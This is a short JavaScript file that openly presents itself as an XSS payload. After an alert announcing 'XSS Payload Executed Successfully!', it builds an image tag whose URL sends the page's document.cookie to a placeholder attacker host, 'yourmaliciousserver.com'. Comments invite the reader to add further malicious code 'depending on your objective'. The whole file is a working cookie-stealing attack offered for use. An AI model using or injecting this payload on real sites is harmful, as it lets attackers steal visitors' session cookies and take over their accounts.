// Display an alert message
alert('XSS Payload Executed Successfully!');

// Example of additional malicious code
// You can add more complex scripts here depending on your objective

// Example: Send cookies to a remote server
var img = document.createElement('img');
img.src = 'https://yourmaliciousserver.com/collect?cookies=' + document.cookie;
document.body.appendChild(img);
